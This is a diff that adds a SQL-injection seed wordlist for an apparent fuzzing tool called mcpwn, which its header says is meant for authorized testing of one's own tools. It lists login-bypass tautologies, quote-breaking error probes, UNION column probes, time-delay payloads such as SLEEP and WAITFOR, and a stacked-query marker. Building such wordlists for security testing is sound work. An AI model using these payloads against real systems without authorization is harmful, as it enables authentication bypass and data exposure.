@@ -1,0 +1,30 @@
+# mcpwn SQL-injection seed wordlist — for AUTHORIZED testing of your own tools.
+# One payload per line; '#' lines are comments. Feed into an argument (fuzzArgs)
+# that a tool interpolates into a SQL query and observe errors, auth bypass, or
+# time delays. Prefer error/time-based detection over destructive statements.
+#
+# Boolean / tautology auth-bypass probes.
+' OR '1'='1
+' OR 1=1--
+" OR 1=1--
+' OR 1=1#
+admin'--
+admin' OR '1'='1'--
+') OR ('1'='1
+# Error-based: break out of the string and watch for a SQL error.
+'
+"
+')
+';
+\'
+# UNION-based column probing.
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+# Time-based blind (benign: delays only).
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' OR pg_sleep(5)--
+1) OR SLEEP(5)#
+# Stacked-query marker (read-only probe).
+'; SELECT 1--
